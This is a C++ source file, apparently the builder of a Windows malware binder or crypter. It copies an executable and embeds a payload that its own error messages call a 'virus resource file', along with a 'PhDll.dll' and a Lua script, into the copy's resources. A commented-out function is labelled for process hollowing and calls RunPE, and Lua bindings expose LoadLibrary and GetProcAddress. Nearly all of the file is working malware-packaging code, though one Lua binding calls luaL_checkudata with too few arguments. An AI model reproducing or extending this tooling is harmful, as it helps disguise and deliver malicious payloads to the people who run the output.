#include "PEGenerator.h"

// ==========================导出方法给lua使用===================== //

// C++ 函数：用来动态加载 DLL
int l_load_library(lua_State* L) {
    const char* dll_name = luaL_checkstring(L, 1);  // 获取第一个参数：DLL 文件名
    HMODULE hModule = LoadLibraryA(dll_name);  // 使用 LoadLibrary 加载 DLL
    if (hModule) {
        lua_pushlightuserdata(L, hModule);  // 将 DLL 的句柄推送到 Lua 栈
        return 1;  // 返回一个值：DLL 句柄
    }
    else {
        lua_pushnil(L);  // 如果加载失败，返回 nil
        return 1;
    }
}

// C++ 函数：用来获取 DLL 函数地址
int l_get_proc_address(lua_State* L) {
    
    HMODULE hModule = (HMODULE)luaL_checkudata(L, 1);  // 获取第一个参数：DLL 句柄
    const char* proc_name = luaL_checkstring(L, 2);  // 获取第二个参数：函数名
    FARPROC funcAddr = GetProcAddress(hModule, proc_name);  // 获取函数地址
    if (funcAddr) {
        lua_pushlightuserdata(L, funcAddr);  // 返回函数地址
        return 1;  // 返回一个值：函数地址
    }
    else {
        lua_pushnil(L);  // 如果获取失败，返回 nil
        return 1;
    }
}

//------------------------------
// 1) C++ 函数：让 Lua 能调用 MessageBoxA
//    show_message_box("Text", "Title")
//------------------------------
static int l_show_message_box(lua_State* L) {
    // 1) 获取参数
    //    - 第一个参数：消息文本 (const char*), 
    //    - 第二个参数：标题 (const char*).
    // 如果脚本不传第二个参数，可设个默认值
    const char* text = luaL_checkstring(L, 1);
    const char* title = luaL_optstring(L, 2, "Message");

    // 2) 调用 MessageBoxA
    //    - 参数：HWND=0, LPCSTR= text, LPCSTR= title, UINT=0 (MB_OK)
    int result = MessageBoxA(NULL, text, title, MB_OK);

    // 3) 将 MessageBoxA 的返回值压到 Lua 栈
    lua_pushinteger(L, result);
    return 1; // 返回值数量=1
}

// ================================================================ //

// 用于资源更新
bool update_resource(CString str_path, HANDLE hUpdate, int rid) {

    bool flag = false;

    do {

        // 打开要添加到资源的文件 phdll
        std::ifstream phfile(L"PhDll.dll", std::ios::binary);
        if (!phfile.is_open()) {
            MessageBox(NULL, L"Failed to open the ph file.", str_path, MB_OK);
        }

        // 读取文件内容到内存 phdll
        phfile.seekg(0, std::ios::end);
        size_t phfileSize = phfile.tellg();
        phfile.seekg(0, std::ios::beg);

        char* buffer = new char[phfileSize];
        phfile.read(buffer, phfileSize);
        phfile.close();

        // 将文件内容更新到资源中 phdll
        if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(rid), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, phfileSize)) {
            MessageBox(NULL, L"Failed to update the phdll to resource.", str_path, MB_OK);
            delete[] buffer;
            break;
        }

        delete[] buffer;
        flag = true;
    } while (0);
    return flag;
}

// 添加文件及资源到新的可执行文件
BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath, CString lua_path) {
    WCHAR tempFilePath[MAX_PATH];

    // 创建临时文件路径
    GetTempPath(MAX_PATH, tempFilePath);
    GetTempFileName(tempFilePath, L"tmp", 0, tempFilePath);

    // 将当前可执行文件复制到临时文件
    if (!CopyFile(exePath, tempFilePath, FALSE)) {
        MessageBox(NULL, L"Failed to create temporary file.", L"generator", MB_OK);
        return FALSE;
    }

    // 打开临时文件进行资源更新
    HANDLE hUpdate = BeginUpdateResource(tempFilePath, FALSE);
    if (!hUpdate) {
        MessageBox(NULL, L"Failed to open file for resource update.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 打开要添加到资源的文件
    std::ifstream file(resourceFilePath, std::ios::binary);
    if (!file.is_open()) {
        MessageBox(NULL, L"Failed to open the input file.", L"generator", MB_OK);
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 读取文件内容到内存
    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    char* buffer = new char[fileSize];
    file.read(buffer, fileSize);
    file.close();

    // 将文件内容更新到资源中
    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_BINARY_FILE), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, fileSize)) {
        MessageBox(NULL, L"Failed to update the resource.", L"generator", MB_OK);
        delete[] buffer;
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    delete[] buffer;


    buffer = nullptr;

    // 打开要添加到资源的文件 phdll
    std::ifstream phfile(L"PhDll.dll", std::ios::binary);
    if (!phfile.is_open()) {
        MessageBox(NULL, L"Failed to open the ph file.", L"generator", MB_OK);
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 读取文件内容到内存 phdll
    phfile.seekg(0, std::ios::end);
    size_t phfileSize = phfile.tellg();
    phfile.seekg(0, std::ios::beg);

    buffer = new char[phfileSize];
    phfile.read(buffer, phfileSize);
    phfile.close();

    // 将文件内容更新到资源中 phdll
    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_PH), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, phfileSize)) {
        MessageBox(NULL, L"Failed to update the phdll to resource.", L"generator", MB_OK);
        delete[] buffer;
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    delete[] buffer;

    if (!lua_path.IsEmpty()) {
        if (!update_resource(lua_path, hUpdate, IDR_LUA)) {
            EndUpdateResource(hUpdate, TRUE);
            DeleteFile(tempFilePath); // 删除临时文件
            return FALSE;
        }
    }


    do {
        // 加载要复制资源的文件
        HMODULE hResourceModule = LoadLibraryEx(resourceFilePath, NULL, LOAD_LIBRARY_AS_DATAFILE);
        if (!hResourceModule) {
            MessageBox(NULL, L"Failed to load virus resource file.", L"generator", MB_OK);
            break;
        }

        // 遍历并更新 resourceFilePath 中的所有资源到新的可执行文件
        ResourceUpdateData updateData = { hUpdate };
        if (!EnumResourceTypes(hResourceModule, EnumTypesProc, (LONG_PTR)&updateData)) {
            MessageBox(NULL, L"Failed to enumerate virus resources.", L"generator", MB_OK);
            FreeLibrary(hResourceModule);
            break;
        }

        // 释放资源模块
        FreeLibrary(hResourceModule);
    } while (0);
    // 完成资源更新
    if (!EndUpdateResource(hUpdate, FALSE)) {
        MessageBox(NULL, L"Failed to finalize resource update.", L"generator", MB_OK);
        return FALSE;
    }

    // 将修改后的临时文件复制到目标文件路径
    if (!CopyFile(tempFilePath, newExePath, FALSE)) {
        MessageBox(NULL, L"Failed to create the final output file.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 删除临时文件
    DeleteFile(tempFilePath);

    MessageBox(NULL, L"Resource added successfully.", L"generator", MB_OK);
    return TRUE;
}

BOOL CALLBACK EnumTypesProc(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam) {
    return EnumResourceNames(hModule, lpType, EnumNamesProc, lParam);
}

BOOL CALLBACK EnumNamesProc(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam) {
    return EnumResourceLanguages(hModule, lpType, lpName, EnumLangsProc, lParam);
}

BOOL CALLBACK EnumLangsProc(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam) {
    ResourceUpdateData* updateData = (ResourceUpdateData*)lParam;
    HRSRC hRes = FindResourceEx(hModule, lpType, lpName, wLanguage);
    if (!hRes) return TRUE;

    HGLOBAL hResData = LoadResource(hModule, hRes);
    if (!hResData) return TRUE;

    DWORD resSize = SizeofResource(hModule, hRes);
    void* pResData = LockResource(hResData);

    if (!UpdateResource(updateData->hUpdate, lpType, lpName, wLanguage, pResData, resSize)) {
        std::cerr << "Failed to update resource." << std::endl;
        return FALSE;
    }
    return TRUE;
}

// 添加文件及资源到新的可执行文件
BOOL AddFileToResource32(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath) {
    WCHAR tempFilePath[MAX_PATH];

    // 创建临时文件路径
    GetTempPath(MAX_PATH, tempFilePath);
    GetTempFileName(tempFilePath, L"tmp", 0, tempFilePath);

    // 将当前可执行文件复制到临时文件
    if (!CopyFile(exePath, tempFilePath, FALSE)) {
        MessageBox(NULL, L"Failed to create temporary file.", L"generator", MB_OK);
        return FALSE;
    }

    // 打开临时文件进行资源更新
    HANDLE hUpdate = BeginUpdateResource(tempFilePath, FALSE);
    if (!hUpdate) {
        MessageBox(NULL, L"Failed to open file for resource update.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }
    // 打开要添加到资源的文件
    std::ifstream file(resourceFilePath, std::ios::binary);
    if (!file.is_open()) {
        MessageBox(NULL, L"Failed to open the input file.", L"generator", MB_OK);
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 读取文件内容到内存
    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    char* buffer = new char[fileSize];
    file.read(buffer, fileSize);
    file.close();

    // 将文件内容更新到资源中
    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_BINARY_FILE), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, fileSize)) {
        MessageBox(NULL, L"Failed to update the resource.", L"generator", MB_OK);
        delete[] buffer;
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    delete[] buffer;
    buffer = nullptr;

    // 打开要添加到资源的文件 phdll
    std::ifstream phfile(L"PhDll.dll", std::ios::binary);
    if (!phfile.is_open()) {
        MessageBox(NULL, L"Failed to open the ph file.", L"generator", MB_OK);
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 读取文件内容到内存 phdll
    phfile.seekg(0, std::ios::end);
    size_t phfileSize = phfile.tellg();
    phfile.seekg(0, std::ios::beg);

    buffer = new char[phfileSize];
    phfile.read(buffer, phfileSize);
    phfile.close();

    // 将文件内容更新到资源中 phdll
    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_PH), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, phfileSize)) {
        MessageBox(NULL, L"Failed to update the phdll to resource.", L"generator", MB_OK);
        delete[] buffer;
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    delete[] buffer;

    

    do {

        // 加载资源文件
        HMODULE hResourceModule = LoadLibraryEx(resourceFilePath, NULL, LOAD_LIBRARY_AS_DATAFILE);
        if (!hResourceModule) {
            MessageBox(NULL, L"Failed to load virus resource file.", L"generator", MB_OK);
            break;
        }

        // 遍历并更新 resourceFilePath 中的所有资源到新的可执行文件
        ResourceUpdateData32 updateData = { hUpdate };
        if (!EnumResourceTypes(hResourceModule, EnumTypesProc32, (LONG_PTR)&updateData)) {
            MessageBox(NULL, L"Failed to enumerate virus resources.", L"generator", MB_OK);
            FreeLibrary(hResourceModule);
            break;
        }

        // 释放资源模块
        FreeLibrary(hResourceModule);
    } while (0);

    // 完成资源更新
    if (!EndUpdateResource(hUpdate, FALSE)) {
        MessageBox(NULL, L"Failed to finalize resource update.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 将修改后的临时文件复制到目标文件路径
    if (!CopyFile(tempFilePath, newExePath, FALSE)) {
        MessageBox(NULL, L"Failed to create the final output file.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // 删除临时文件
        return FALSE;
    }

    // 删除临时文件
    DeleteFile(tempFilePath);

    MessageBox(NULL, L"Resource added successfully.", L"generator", MB_OK);
    return TRUE;
}

// 枚举资源类型
BOOL CALLBACK EnumTypesProc32(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam) {
    return EnumResourceNames(hModule, lpType, EnumNamesProc32, lParam);
}

// 枚举资源名称
BOOL CALLBACK EnumNamesProc32(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam) {
    return EnumResourceLanguages(hModule, lpType, lpName, EnumLangsProc32, lParam);
}

// 枚举资源语言并更新资源
BOOL CALLBACK EnumLangsProc32(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam) {
    ResourceUpdateData32* updateData = (ResourceUpdateData32*)lParam;
    HRSRC hRes = FindResourceEx(hModule, lpType, lpName, wLanguage);
    if (!hRes) return TRUE;

    HGLOBAL hResData = LoadResource(hModule, hRes);
    if (!hResData) return TRUE;

    DWORD resSize = SizeofResource(hModule, hRes);
    void* pResData = LockResource(hResData);

    if (!UpdateResource(updateData->hUpdate, lpType, lpName, wLanguage, pResData, resSize)) {
        std::cerr << "Failed to update resource." << std::endl;
        return FALSE;
    }
    return TRUE;
}

//// 用于 Process Hollowing 的辅助线程函数
//DWORD WINAPI HollowingThread(LPVOID lpParam) {
//    HANDLE hMainThread = (HANDLE)lpParam;
//
//    // 暂停主线程
//    if (SuspendThread(hMainThread) == -1) {
//        return 1;
//    }
//
//    RunPE();
//
//
//}
